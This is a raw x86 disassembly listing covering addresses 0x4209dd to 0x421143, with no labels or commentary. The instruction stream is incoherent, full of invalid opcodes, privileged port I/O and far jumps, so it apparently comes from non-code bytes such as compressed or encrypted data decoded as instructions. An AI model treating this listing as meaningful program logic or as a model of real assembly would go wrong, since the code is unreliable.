  4209dd:	sar    BYTE PTR [edx-0x4c],cl
  4209e0:	pop    ebp
  4209e1:	mov    ecx,0x9afb6bf4
  4209e6:	aad    0x66
  4209e8:	mov    ebx,0x1f096e80
  4209ed:	ss and bh,al
  4209f0:	in     eax,0x80
  4209f2:	mov    bl,0x5a
  4209f4:	retf   0xcd5
  4209f7:	stos   DWORD PTR es:[edi],eax
  4209f8:	loopne 0x4209f8
  4209fa:	sub    esi,DWORD PTR [esp+eiz*8+0x115d1dea]
  420a01:	xor    DWORD PTR [ebx+0x2634df2f],ebx
  420a07:	xor    DWORD PTR [esi],edi
  420a09:	push   ds
  420a0a:	fwait
  420a0b:	sahf   
  420a0c:	ins    DWORD PTR es:[edi],dx
  420a0d:	sar    BYTE PTR [esi+0x5a46f599],1
  420a13:	inc    esi
  420a14:	xor    DWORD PTR [eax],0x82dc4380
  420a1a:	xchg   ecx,eax
  420a1b:	jmp    FWORD PTR [ecx]
  420a1d:	out    dx,al
  420a1e:	shl    DWORD PTR [ecx-0x3d],0x2b
  420a22:	popa   
  420a23:	mov    ebp,0x3e0af555
  420a28:	dec    ebp
  420a29:	cs clc 
  420a2b:	test   eax,0x8a5b4fe8
  420a30:	lods   al,BYTE PTR ds:[esi]
  420a31:	jnp    0x420a23
  420a33:	iret   
  420a34:	push   ebx
  420a35:	and    BYTE PTR [eax+0x15571d68],0xff
  420a3c:	sahf   
  420a3d:	in     al,dx
  420a3e:	icebp  
  420a3f:	arpl   WORD PTR [ecx],si
  420a41:	sbb    eax,DWORD PTR [eax-0x79]
  420a44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a45:	push   esi
  420a46:	mov    al,ds:0xb0f2312a
  420a4b:	(bad)  [eax+0x70f00e44]
  420a51:	(bad)  
  420a52:	je     0x420a71
  420a54:	xchg   ebp,eax
  420a55:	in     al,dx
  420a56:	mov    ds:0x36e9392f,eax
  420a5b:	inc    edx
  420a5c:	sar    bl,0xde
  420a5f:	jb     0x420ab7
  420a61:	mov    bh,0x2a
  420a63:	mov    DWORD PTR [esi],edi
  420a65:	stos   DWORD PTR es:[edi],eax
  420a66:	push   esp
  420a67:	fmulp  st(4),st
  420a69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a6a:	bound  esi,QWORD PTR [ecx+0x10]
  420a6d:	jno    0x420ac4
  420a6f:	xchg   ecx,eax
  420a70:	retf   
  420a71:	fwait
  420a72:	mov    DWORD PTR [edx+0x8],edx
  420a75:	(bad)  
  420a76:	call   0xeaf98798
  420a7b:	daa    
  420a7c:	push   ebx
  420a7d:	aaa    
  420a7e:	(bad)  
  420a7f:	jg     0x420a44
  420a81:	xlat   BYTE PTR ds:[ebx]
  420a82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a83:	adc    eax,0x899f84af
  420a88:	inc    edx
  420a89:	gs sbb dh,al
  420a8c:	lods   eax,DWORD PTR ds:[esi]
  420a8d:	xchg   cl,cl
  420a8f:	(bad)  
  420a90:	sbb    ecx,DWORD PTR [esp+esi*4]
  420a93:	ins    DWORD PTR es:[edi],dx
  420a94:	sub    al,0x5d
  420a96:	mov    ch,0xc
  420a98:	mov    bh,0xd3
  420a9a:	cwde   
  420a9b:	jnp    0x420ab1
  420a9d:	sar    BYTE PTR [edi],cl
  420a9f:	rcl    BYTE PTR [ebx-0x7a],1
  420aa2:	push   ss
  420aa3:	cmp    edx,DWORD PTR [ebx-0x64f001ff]
  420aa9:	adc    BYTE PTR [ebx],dl
  420aab:	pop    DWORD PTR [ebx+0x784f0fa5]
  420ab1:	out    0x54,al
  420ab3:	into   
  420ab4:	xor    BYTE PTR [esi],dl
  420ab6:	std    
  420ab7:	scas   eax,DWORD PTR es:[edi]
  420ab8:	repnz mov ebp,0x2b90ef22
  420abe:	push   esp
  420abf:	sub    DWORD PTR [edi],esp
  420ac1:	out    0x3c,eax
  420ac3:	hlt    
  420ac4:	pop    es
  420ac5:	in     eax,dx
  420ac6:	and    BYTE PTR [eax+0x58],al
  420ac9:	out    0xed,eax
  420acb:	cmp    esi,DWORD PTR [esi-0x45]
  420ace:	mov    dh,0x1b
  420ad0:	xchg   edx,eax
  420ad1:	sub    al,0x58
  420ad3:	aad    0xe8
  420ad5:	sbb    BYTE PTR [ebx+0x168d0d1d],ch
  420adb:	(bad)  
  420adc:	sub    al,0xbe
  420ade:	adc    DWORD PTR [edx+ebp*2-0x5b1ae2ab],0x22d4eb52
  420ae9:	jge    0x420ab0
  420aeb:	(bad)  
  420aec:	and    eax,0xc0c3fa20
  420af1:	inc    edx
  420af2:	dec    ecx
  420af3:	lods   al,BYTE PTR ds:[esi]
  420af4:	lods   al,BYTE PTR ds:[esi]
  420af5:	in     eax,dx
  420af6:	fild   DWORD PTR [ecx]
  420af8:	push   edx
  420af9:	loopne 0x420ac6
  420afb:	ficomp WORD PTR [ecx+0x73]
  420afe:	jp     0x420b74
  420b00:	mov    ecx,0x7ad66e06
  420b05:	dec    edi
  420b06:	push   esi
  420b07:	xor    ah,bl
  420b09:	inc    esi
  420b0b:	inc    ebx
  420b0c:	sub    BYTE PTR ds:0x74a3af44,0xcb
  420b13:	sbb    DWORD PTR [eax+edx*1],eax
  420b16:	popf   
  420b17:	retf   0x618d
  420b1a:	sti    
  420b1b:	jbe    0x420ae1
  420b1d:	push   0x4e
  420b1f:	pop    esi
  420b20:	stos   BYTE PTR es:[edi],al
  420b21:	arpl   di,sp
  420b23:	ret    0xde99
  420b26:	jmp    0x19ff:0xadc957c3
  420b2d:	gs dec ebp
  420b2f:	sub    BYTE PTR [edi-0x25],ah
  420b32:	jecxz  0x420afe
  420b34:	adc    al,0x49
  420b36:	jg     0x420b1d
  420b38:	outs   dx,BYTE PTR ds:[esi]
  420b39:	push   esp
  420b3a:	outs   dx,DWORD PTR ds:[esi]
  420b3b:	ins    DWORD PTR es:[edi],dx
  420b3c:	ss daa 
  420b3e:	sub    edi,ebp
  420b40:	stos   DWORD PTR es:[edi],eax
  420b41:	pop    ebx
  420b42:	outs   dx,DWORD PTR ds:[esi]
  420b43:	jle    0x420b60
  420b45:	sub    bh,ah
  420b47:	sub    edx,ecx
  420b49:	and    eax,0x2159969e
  420b4e:	cs and al,0x9d
  420b51:	dec    esi
  420b52:	aaa    
  420b53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b54:	fcmove st,st(7)
  420b56:	ret    
  420b57:	fcmovnbe st,st(7)
  420b59:	xor    DWORD PTR [eax+edx*4],eax
  420b5c:	scas   al,BYTE PTR es:[edi]
  420b5d:	mov    cl,0x82
  420b5f:	aaa    
  420b60:	mov    dl,0xdf
  420b62:	lea    ebx,ds:0xe7a07fef
  420b68:	pop    edx
  420b69:	jo     0x420bb8
  420b6b:	clc    
  420b6c:	add    DWORD PTR ds:0x404c2155,0x28a00a5d
  420b76:	pop    esi
  420b77:	loop   0x420b8b
  420b79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b7a:	mul    ebx
  420b7c:	stos   BYTE PTR es:[edi],al
  420b7d:	imul   ebx,DWORD PTR [edi+0x64fec692],0xffffff96
  420b84:	scas   eax,DWORD PTR es:[edi]
  420b85:	cwde   
  420b86:	ja     0x420bdf
  420b88:	mov    ebp,0x960626eb
  420b8d:	adc    ch,BYTE PTR [edx]
  420b8f:	sub    esi,DWORD PTR [edi+0x754dec3d]
  420b95:	mov    WORD PTR [ecx],cs
  420b97:	push   ebx
  420b98:	scas   eax,DWORD PTR es:[edi]
  420b99:	sbb    BYTE PTR [edx],al
  420b9b:	(bad)  
  420b9c:	dec    edx
  420b9d:	push   es
  420b9e:	push   ss
  420b9f:	int3   
  420ba0:	inc    eax
  420ba1:	mov    bl,BYTE PTR [edx+eiz*8+0x31063ffa]
  420ba8:	ins    BYTE PTR es:[edi],dx
  420ba9:	(bad)  
  420baa:	loopne 0x420bae
  420bac:	aaa    
  420bad:	or     eax,0x48d8ada3
  420bb2:	addr16 in eax,0xf4
  420bb5:	inc    esi
  420bb6:	mov    ebx,0x2cd0447e
  420bbb:	out    dx,eax
  420bbc:	pop    es
  420bbd:	inc    ebx
  420bbe:	pushf  
  420bbf:	sti    
  420bc0:	fidivr DWORD PTR [ebp+0x72]
  420bc3:	dec    eax
  420bc4:	dec    edx
  420bc5:	adc    eax,0x984b67b6
  420bca:	jno    0x420be6
  420bcc:	rcr    cl,1
  420bce:	xor    dl,BYTE PTR [eax+0x23]
  420bd1:	gs ins BYTE PTR es:[edi],dx
  420bd3:	or     al,0x21
  420bd5:	clc    
  420bd6:	(bad)  [edx]
  420bd8:	cwde   
  420bd9:	push   eax
  420bda:	mov    DWORD PTR [ebp-0xea916b0],esp
  420be0:	and    ebp,ebp
  420be2:	stc    
  420be3:	inc    ebx
  420be4:	popf   
  420be5:	xchg   DWORD PTR [eax],esp
  420be7:	xchg   edi,eax
  420be8:	cmp    al,0xd6
  420bea:	mov    DWORD PTR ds:0xb72cb224,esp
  420bf0:	(bad)  
  420bf1:	jns    0x420bdd
  420bf3:	and    ecx,DWORD PTR [ebp-0x6799de5a]
  420bf9:	jecxz  0x420c6c
  420bfb:	rcl    BYTE PTR [ebp-0x7194c9c2],1
  420c01:	ins    BYTE PTR es:[edi],dx
  420c02:	sbb    al,0x96
  420c04:	fucom  st(5)
  420c06:	xchg   edx,eax
  420c07:	inc    al
  420c09:	les    ebx,FWORD PTR [ecx-0x5]
  420c0c:	in     eax,dx
  420c0d:	or     BYTE PTR [edi],ch
  420c0f:	stos   DWORD PTR es:[edi],eax
  420c10:	int    0x30
  420c12:	pushf  
  420c13:	jne    0x420bdc
  420c15:	(bad)  
  420c16:	retf   
  420c17:	jns    0x420bf3
  420c19:	int    0x6b
  420c1b:	arpl   WORD PTR [ebp-0xa],ax
  420c1e:	cmp    eax,0x3d62530a
  420c23:	dec    eax
  420c24:	xor    dh,ah
  420c26:	cwde   
  420c27:	dec    edx
  420c28:	xchg   ah,ah
  420c2a:	test   DWORD PTR [ebx+esi*4-0x5e],edx
  420c2e:	stos   BYTE PTR es:[edi],al
  420c2f:	je     0x420c25
  420c31:	adc    al,0x8e
  420c33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c34:	xor    al,0x69
  420c36:	push   edx
  420c37:	outs   dx,DWORD PTR ds:[esi]
  420c38:	sub    dl,cl
  420c3a:	mov    ch,0x39
  420c3c:	and    bl,BYTE PTR [ebx+0x4c31182e]
  420c42:	and    eax,0x8eb37e0b
  420c47:	jge    0x420bd5
  420c49:	mov    dh,0xcc
  420c4b:	xchg   ebx,eax
  420c4c:	xor    DWORD PTR [eax+0x137ca21a],ecx
  420c52:	mov    bl,cl
  420c54:	push   es
  420c55:	adc    al,0x3f
  420c57:	shr    dl,cl
  420c59:	sub    ecx,ebp
  420c5b:	es mov esp,0x797ca123
  420c61:	fstp   QWORD PTR [ebp+0x340b17af]
  420c67:	leave  
  420c68:	adc    esi,DWORD PTR [eax-0x53]
  420c6b:	adc    dh,BYTE PTR [ecx+ecx*8+0x489ebeaf]
  420c72:	shr    BYTE PTR [ebx],0xf8
  420c75:	fidiv  DWORD PTR [edi+0x44]
  420c78:	scas   al,BYTE PTR es:[edi]
  420c79:	inc    esp
  420c7a:	ins    DWORD PTR es:[edi],dx
  420c7b:	fcomp  DWORD PTR [edi-0x4dd3db38]
  420c81:	lods   al,BYTE PTR ds:[esi]
  420c82:	mov    eax,0x66aa9deb
  420c87:	lock xchg DWORD PTR ds:0xd772a839,ecx
  420c8e:	add    eax,ebx
  420c90:	cmp    ebp,DWORD PTR [ebp+0x7530ec8d]
  420c96:	pop    ss
  420c97:	add    eax,edi
  420c99:	adc    al,al
  420c9b:	repnz std 
  420c9d:	jno    0x420c99
  420c9f:	push   0x17064062
  420ca4:	xchg   edx,eax
  420ca5:	inc    edi
  420ca6:	lods   eax,DWORD PTR ds:[esi]
  420ca7:	jg     0x420cbb
  420ca9:	cli    
  420caa:	repz (bad) 
  420cac:	xor    bl,BYTE PTR [ecx-0x57146279]
  420cb2:	add    edx,ebp
  420cb4:	stos   BYTE PTR es:[edi],al
  420cb5:	fwait
  420cb6:	jmp    0x6fe2:0x497d0565
  420cbd:	push   es
  420cbe:	scas   eax,DWORD PTR es:[edi]
  420cbf:	xor    dl,BYTE PTR [ecx]
  420cc1:	or     DWORD PTR [edi*2-0x6061c188],eax
  420cc8:	ins    DWORD PTR es:[edi],dx
  420cc9:	jl     0x420d06
  420ccb:	outs   dx,BYTE PTR ds:[esi]
  420ccc:	neg    BYTE PTR [ebp-0x4f9aabc5]
  420cd2:	outs   dx,BYTE PTR ds:[esi]
  420cd3:	cmp    ecx,DWORD PTR [ebx]
  420cd5:	(bad)  
  420cd6:	dec    ecx
  420cd7:	sub    eax,edx
  420cd9:	mov    dh,0xf7
  420cdb:	hlt    
  420cdc:	imul   ecx,DWORD PTR [eax+0x60db53d8],0x5bc92a9e
  420ce6:	mov    bl,0xec
  420ce8:	xor    ah,BYTE PTR [ecx]
  420cea:	mov    BYTE PTR [esi+edi*2+0x6effa8f5],bl
  420cf1:	in     eax,dx
  420cf2:	jle    0x420ca4
  420cf4:	lods   al,BYTE PTR ds:[esi]
  420cf5:	test   edx,eax
  420cf7:	pop    ss
  420cf8:	inc    esp
  420cf9:	div    DWORD PTR [esi+ecx*2+0x40]
  420cfd:	out    0x0,al
  420cff:	les    ecx,FWORD PTR [eax]
  420d01:	pop    es
  420d02:	lea    edx,[ebx]
  420d04:	int    0xe6
  420d06:	dec    esp
  420d07:	test   al,0xda
  420d09:	push   0x30272165
  420d0e:	xchg   edx,eax
  420d0f:	icebp  
  420d10:	nop
  420d11:	cmc    
  420d12:	les    edi,FWORD PTR [eax+0x39920d05]
  420d18:	lods   eax,DWORD PTR ds:[esi]
  420d19:	mov    eax,0xd0867d5e
  420d1e:	es loop 0x420d63
  420d21:	push   esi
  420d22:	adc    edx,DWORD PTR [ebx+0xf03f67a]
  420d28:	jbe    0x420d07
  420d2a:	or     DWORD PTR [ecx-0x6468f7f4],eax
  420d30:	sar    DWORD PTR [edi-0x26],1
  420d33:	test   ebx,esp
  420d35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d36:	(bad)  
  420d37:	pop    ecx
  420d38:	sbb    eax,0xc82f161d
  420d3d:	shr    al,1
  420d3f:	push   edx
  420d40:	cmp    al,0xf4
  420d42:	xchg   edi,eax
  420d43:	outs   dx,BYTE PTR ds:[esi]
  420d44:	pop    esp
  420d45:	test   eax,0x639c0190
  420d4a:	fwait
  420d4b:	mov    ebx,DWORD PTR ds:0x1eacbb0d
  420d51:	add    eax,0x15db67e6
  420d56:	iret   
  420d57:	out    dx,eax
  420d58:	push   ebp
  420d59:	jge    0x420dd3
  420d5b:	pop    ebx
  420d5c:	repz pop edx
  420d5e:	test   eax,ecx
  420d60:	push   edi
  420d61:	mov    ebx,0x2457eb6b
  420d66:	pusha  
  420d67:	adc    eax,0xaaa3ae0e
  420d6c:	sub    esp,DWORD PTR [edi+0x10]
  420d6f:	jbe    0x420d41
  420d71:	(bad)  
  420d72:	mov    ebx,0x47c893a6
  420d77:	fcom   QWORD PTR [ecx]
  420d79:	lods   eax,DWORD PTR ds:[esi]
  420d7a:	xchg   esp,eax
  420d7b:	js     0x420de8
  420d7d:	cmp    al,0xa1
  420d7f:	jb     0x420de3
  420d81:	popa   
  420d82:	fsub   DWORD PTR [ecx+0x141ba702]
  420d88:	out    dx,eax
  420d89:	rcr    DWORD PTR [eax-0x10],1
  420d8c:	or     edi,DWORD PTR [ecx]
  420d8e:	int3   
  420d8f:	call   0xf055b99f
  420d94:	push   ecx
  420d95:	js     0x420d92
  420d97:	imul   edx,DWORD PTR [edx-0x49],0xffffffa3
  420d9b:	jns    0x420dc6
  420d9d:	sbb    al,0xd1
  420d9f:	dec    esi
  420da0:	sbb    esp,edx
  420da2:	loopne 0x420de4
  420da4:	jb     0x420de0
  420da6:	sti    
  420da7:	fild   QWORD PTR [ebp-0x16476c06]
  420dad:	mov    eax,0x57132181
  420db2:	dec    edi
  420db3:	das    
  420db4:	mov    bh,0x2d
  420db6:	jmp    0x4584:0x6725dc9b
  420dbd:	and    ebx,DWORD PTR [eax+0x1a]
  420dc0:	icebp  
  420dc1:	popf   
  420dc2:	inc    edx
  420dc3:	mov    al,ds:0x84d064a0
  420dc8:	and    eax,0x57d5eb41
  420dcd:	ins    DWORD PTR es:[edi],dx
  420dce:	shl    DWORD PTR [eax-0x64],0xd4
  420dd2:	fld    QWORD PTR [esi-0x9]
  420dd5:	test   DWORD PTR [edi],edx
  420dd7:	test   al,0x9a
  420dd9:	retf   0x9d19
  420ddc:	xchg   ecx,eax
  420ddd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420dde:	ret    
  420ddf:	(bad)  
  420de1:	mul    DWORD PTR [edx+0x3349d91c]
  420de7:	xchg   cx,ax
  420dea:	inc    ebp
  420deb:	lods   al,BYTE PTR ds:[esi]
  420dec:	iret   
  420ded:	ins    BYTE PTR es:[edi],dx
  420dee:	inc    eax
  420def:	test   DWORD PTR [eax],esp
  420df1:	fidivr WORD PTR [eax+0x441631c1]
  420df7:	inc    ebp
  420df8:	aaa    
  420df9:	mov    WORD PTR [ecx],cs
  420dfb:	pop    ss
  420dfc:	mov    ebp,0xe3ae0bdb
  420e01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e02:	imul   eax,DWORD PTR [ebp-0x7d089ef5],0xffffffcf
  420e09:	jecxz  0x420d9e
  420e0b:	loope  0x420e82
  420e0d:	(bad)
  420e10:	add    edx,DWORD PTR [esi-0x21]
  420e13:	inc    ebp
  420e14:	ret    0xd3f0
  420e17:	jl     0x420e32
  420e19:	lea    edx,[ecx-0x57]
  420e1c:	gs sbb ch,BYTE PTR ds:[esi-0x528ee109]
  420e24:	dec    ebx
  420e25:	loope  0x420df4
  420e27:	sbb    eax,0x5a1b14dc
  420e2c:	loop   0x420e0a
  420e2e:	out    0x62,al
  420e30:	in     eax,dx
  420e31:	retf   0x436b
  420e34:	div    DWORD PTR [ebp+0x48]
  420e37:	push   cs
  420e38:	cmp    dl,cl
  420e3a:	out    0x47,al
  420e3c:	dec    edx
  420e3d:	mov    bl,0x84
  420e3f:	sub    esi,ecx
  420e41:	and    ebp,DWORD PTR [edx-0x56c5ebfb]
  420e47:	sbb    BYTE PTR [edx+ebx*1],0xf6
  420e4b:	cdq    
  420e4c:	hlt    
  420e4d:	jae    0x420e29
  420e4f:	scas   al,BYTE PTR es:[edi]
  420e50:	(bad)  
  420e51:	jbe    0x420e47
  420e53:	add    dh,BYTE PTR cs:[edx]
  420e56:	scas   al,BYTE PTR es:[edi]
  420e57:	mov    ds:0xd4a74697,eax
  420e5c:	out    0xfa,al
  420e5e:	sbb    al,0x2a
  420e60:	inc    ecx
  420e61:	xor    ch,BYTE PTR [edx]
  420e63:	fnsave [ebp-0x3866480f]
  420e69:	ret    
  420e6a:	xchg   esp,eax
  420e6b:	retf   0xb70b
  420e6e:	lock shl DWORD PTR [edi+0x5085bf0a],1
  420e75:	std    
  420e76:	sbb    BYTE PTR [edi],dh
  420e78:	mov    edx,DWORD PTR [esi+0x10c92c4b]
  420e7e:	push   es
  420e7f:	lock mov esp,0x756d9ac3
  420e85:	xor    esp,ecx
  420e87:	jo     0x420e50
  420e89:	mov    ch,0x94
  420e8b:	fdivr  DWORD PTR [eax+esi*2-0x4b]
  420e8f:	mov    ch,0x66
  420e91:	add    eax,0xe683f77e
  420e96:	retf   
  420e97:	pusha  
  420e98:	repz addr16 ja 0x420ea1
  420e9c:	popf   
  420e9d:	and    DWORD PTR [esp+edi*8-0x24e7f74f],esp
  420ea4:	(bad)  [ebp-0x3a8985e5]
  420eaa:	or     al,0x83
  420eac:	add    al,0xfd
  420eae:	mov    ch,0xde
  420eb0:	les    eax,FWORD PTR [eax-0x2b]
  420eb3:	test   eax,0x4ae9aec
  420eb8:	sub    eax,0xd22ae984
  420ebd:	pop    ebx
  420ebe:	iret   
  420ebf:	xor    BYTE PTR [edx],0x54
  420ec2:	and    al,ah
  420ec4:	les    edx,FWORD PTR [ebp+0x21]
  420ec7:	pop    ecx
  420ec8:	push   edx
  420ec9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420eca:	into   
  420ecb:	jecxz  0x420edf
  420ecd:	pop    esp
  420ece:	arpl   WORD PTR [ebp+0x69],ax
  420ed1:	dec    esp
  420ed2:	dec    esi
  420ed3:	mov    bh,0x24
  420ed5:	pushf  
  420ed6:	int    0x51
  420ed8:	(bad)  
  420ed9:	fxch   st(0)
  420edb:	cs out 0x11,al
  420ede:	add    al,0xd3
  420ee0:	or     al,0xf7
  420ee2:	mov    WORD PTR [edx+0x5c30a334],es
  420ee8:	popa   
  420ee9:	jp     0x420f6a
  420eeb:	mov    bh,0xb2
  420eed:	pusha  
  420eee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420eef:	and    ch,ch
  420ef1:	mov    ch,0x9d
  420ef3:	(bad)  
  420ef4:	sbb    DWORD PTR [ecx-0x3b],esi
  420ef7:	adc    DWORD PTR [edi+0x77],ebp
  420efa:	leave  
  420efb:	out    dx,al
  420efc:	push   esp
  420efd:	repnz push ebx
  420eff:	sbb    edi,ebx
  420f01:	cmp    eax,DWORD PTR [eax]
  420f03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f04:	push   eax
  420f05:	lods   eax,DWORD PTR ds:[esi]
  420f06:	pushf  
  420f07:	not    BYTE PTR [esi]
  420f09:	loop   0x420f5b
  420f0b:	sbb    ecx,DWORD PTR [eax+eax*8-0x7f]
  420f0f:	addr16 ret 
  420f11:	int    0x18
  420f13:	lock scas eax,DWORD PTR es:[edi]
  420f15:	ss xchg edx,eax
  420f17:	or     al,bl
  420f19:	push   edx
  420f1a:	repnz test eax,0x9d76c334
  420f20:	(bad)  
  420f21:	je     0x420ed3
  420f23:	adc    BYTE PTR [edi-0x12183c27],al
  420f29:	es dec edi
  420f2b:	arpl   WORD PTR [edx],sp
  420f2d:	xor    al,0x92
  420f2f:	(bad)  
  420f31:	jmp    0x692b86e7
  420f36:	outs   dx,BYTE PTR ds:[esi]
  420f37:	jl     0x420ec1
  420f39:	adc    eax,0xfdc1d386
  420f3e:	add    BYTE PTR [ebx],dl
  420f40:	sbb    edi,edx
  420f42:	or     BYTE PTR [edi+0x6f],ah
  420f45:	clc    
  420f46:	inc    esi
  420f47:	outs   dx,BYTE PTR ds:[esi]
  420f48:	pop    ebx
  420f49:	cld    
  420f4a:	xor    eax,0xf32ffcee
  420f4f:	arpl   WORD PTR [ebx-0x8],bx
  420f52:	test   BYTE PTR [edi],0xcc
  420f55:	sahf   
  420f56:	xor    DWORD PTR [ecx],edx
  420f58:	sub    DWORD PTR [ebx],esp
  420f5a:	fbld   TBYTE PTR [eax-0x1a]
  420f5d:	add    al,0x2e
  420f5f:	mov    dh,0xea
  420f61:	mov    edx,0x3b84a2db
  420f66:	mov    cs,ebx
  420f68:	cwde   
  420f69:	jo     0x420f71
  420f6b:	out    0x52,al
  420f6d:	cs addr16 mov ch,0xf5
  420f71:	fidivr WORD PTR [esi+0x38]
  420f74:	addr16 es dec edx
  420f77:	jnp    0x420f0b
  420f79:	(bad)
  420f7d:	shl    BYTE PTR [eax+0x2917ee47],cl
  420f83:	lods   al,BYTE PTR ds:[esi]
  420f84:	mov    esi,0x323bed90
  420f89:	inc    ebp
  420f8a:	inc    esi
  420f8b:	push   ebp
  420f8c:	(bad)  [eax]
  420f8e:	xchg   esi,eax
  420f8f:	ror    BYTE PTR [esp+eax*1-0x1a],1
  420f93:	xchg   BYTE PTR ds:0x7d12a191,cl
  420f99:	push   ecx
  420f9a:	in     al,0x1
  420f9c:	sahf   
  420f9d:	mov    esi,gs
  420f9f:	(bad)  
  420fa0:	es (bad) 
  420fa2:	or     BYTE PTR [ebx-0x1],al
  420fa5:	sbb    al,0x2d
  420fa7:	mov    bl,0x93
  420fa9:	xlat   BYTE PTR ds:[ebx]
  420faa:	lds    edx,FWORD PTR [ebx-0x16]
  420fad:	dec    edi
  420fae:	mov    esp,0xb1b4cfaf
  420fb3:	inc    ecx
  420fb4:	test   BYTE PTR [edx+0x1e],cl
  420fb7:	ds jge 0x421032
  420fba:	xor    eax,0x9dd2d393
  420fbf:	push   ecx
  420fc0:	and    bh,BYTE PTR [ecx-0x6140786]
  420fc6:	repnz (bad) 
  420fc8:	and    eax,0x1bbf95e
  420fcd:	mov    esp,0xdee5b4e6
  420fd2:	fwait
  420fd3:	test   dl,ch
  420fd5:	cdq    
  420fd6:	mov    ecx,DWORD PTR [ebx+0xb7c8f72]
  420fdc:	sub    ch,BYTE PTR [edx-0x3a]
  420fdf:	dec    eax
  420fe0:	rcl    DWORD PTR [ebx+0x75a3992d],cl
  420fe6:	int    0xb6
  420fe8:	std    
  420fe9:	cwde   
  420fea:	push   es
  420feb:	and    BYTE PTR [esi-0x5a],dl
  420fee:	cmp    ecx,0x6f53da1c
  420ff4:	out    0x5c,al
  420ff6:	clc    
  420ff7:	sti    
  420ff8:	xchg   esp,esp
  420ffa:	add    DWORD PTR [ebp-0xc],eax
  420ffd:	clc    
  420ffe:	mov    bl,0xc3
  421000:	pusha  
  421001:	jle    0x420fe1
  421003:	dec    edi
  421004:	pop    ds
  421005:	mov    WORD PTR [esp+ebx*4+0x4bdc9ffc],?
  42100c:	sbb    al,0xaf
  42100e:	(bad)  
  42100f:	jmp    0x79f3:0x10734297
  421016:	push   0xa7336d71
  42101b:	jbe    0x42103c
  42101d:	repz push esi
  42101f:	xchg   dh,dh
  421021:	mov    esp,DWORD PTR ds:0x51cb8bcc
  421027:	pop    ecx
  421028:	cs int3 
  42102a:	xchg   BYTE PTR [esi+0x617d451e],dl
  421030:	shl    BYTE PTR [ebx-0x3d],0xec
  421034:	dec    ebx
  421035:	pop    es
  421036:	mov    ds:0xe520998e,ax
  42103c:	mov    edi,0xba278cc6
  421041:	xchg   esp,eax
  421042:	mov    ecx,0x2f353305
  421047:	and    DWORD PTR [ecx-0x10],edi
  42104a:	aam    0x19
  42104c:	loope  0x4210ac
  42104e:	iret   
  42104f:	dec    ecx
  421050:	cmp    BYTE PTR [edi+ebx*8+0x68],0xd3
  421055:	das    
  421056:	jmp    0x421015
  421058:	retf   0xc9c7
  42105b:	xchg   ebx,eax
  42105c:	retf   
  42105d:	ja     0x42101d
  42105f:	cmp    DWORD PTR ds:[ebp*4-0xac79f8a],ebp
  421067:	mov    ch,0x67
  421069:	pop    edx
  42106a:	mov    esi,0x8a8ffd41
  42106f:	and    BYTE PTR [ebp-0x46305255],ch
  421075:	ss addr16 adc eax,0xd5ceaf76
  42107c:	add    al,0x88
  42107e:	out    dx,eax
  42107f:	adc    DWORD PTR [ecx-0x21f1b3b3],ecx
  421085:	pop    esi
  421086:	sub    al,0xa5
  421088:	lods   al,BYTE PTR ds:[esi]
  421089:	and    DWORD PTR [esi],edi
  42108b:	call   0x9eac:0xcfc9a62d
  421092:	es out 0xd,al
  421095:	aad    0xe5
  421097:	jp     0x421102
  421099:	pop    ds
  42109a:	xor    dl,BYTE PTR [esi]
  42109c:	push   es
  42109d:	jo     0x421092
  42109f:	add    eax,DWORD PTR [ecx-0x5c3a8726]
  4210a5:	lock push eax
  4210a7:	ja     0x421069
  4210a9:	cmp    eax,ebp
  4210ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210ac:	loope  0x42106c
  4210ae:	int    0x38
  4210b0:	pop    esi
  4210b1:	shr    DWORD PTR [ebx],cl
  4210b3:	adc    DWORD PTR [edx-0x73],0x4b
  4210b7:	pop    ebp
  4210b8:	inc    eax
  4210b9:	in     al,0xb2
  4210bb:	cli    
  4210bc:	inc    edi
  4210bd:	xor    eax,0x5fbe3639
  4210c2:	cmp    dh,dh
  4210c4:	repz push edi
  4210c6:	xchg   ecx,eax
  4210c7:	jmp    0x4210c3
  4210c9:	pop    eax
  4210ca:	or     al,0x3
  4210cc:	mov    dl,0x23
  4210ce:	icebp  
  4210cf:	enter  0x6883,0x89
  4210d3:	fsub   DWORD PTR [ebp-0x1f]
  4210d6:	retf   0x2a42
  4210d9:	out    dx,al
  4210da:	add    DWORD PTR [ebx*8-0x6def7bbc],0x54b4a437
  4210e5:	test   al,0x1
  4210e7:	mov    eax,ds:0xfbe6c557
  4210ec:	mov    esi,0xc1e592ba
  4210f1:	iret   
  4210f2:	mov    BYTE PTR [ebx],0x2e
  4210f5:	adc    al,0x1b
  4210f7:	push   0x22
  4210f9:	and    BYTE PTR [ebp-0x33995f7d],al
  4210ff:	xor    DWORD PTR [eax-0x3d25f92e],edi
  421105:	xchg   DWORD PTR [esi],esi
  421107:	jmp    0xc613397d
  42110c:	sbb    eax,0xb3522d2b
  421111:	in     al,0xe6
  421113:	loope  0x4210f5
  421115:	add    al,0x1b
  421117:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421118:	inc    ebx
  421119:	test   eax,0xcc358765
  42111e:	fcom   st(2)
  421120:	cdq    
  421121:	fcom   DWORD PTR [esp+ebp*8+0x6e1b9d8d]
  421128:	xor    al,0x79
  42112a:	jge    0x4210d7
  42112c:	adc    al,ah
  42112e:	cld    
  42112f:	or     DWORD PTR [edx],ebp
  421131:	jbe    0x4210cc
  421133:	aaa    
  421134:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421135:	xchg   ecx,eax
  421136:	cli    
  421137:	(bad)  
  421138:	lock push eax
  42113a:	neg    edi
  42113c:	or     al,0x77
  42113e:	jns    0x4211a3
  421140:	imul   ecx,esp,0xffffffe8
  421143:	pop    ds
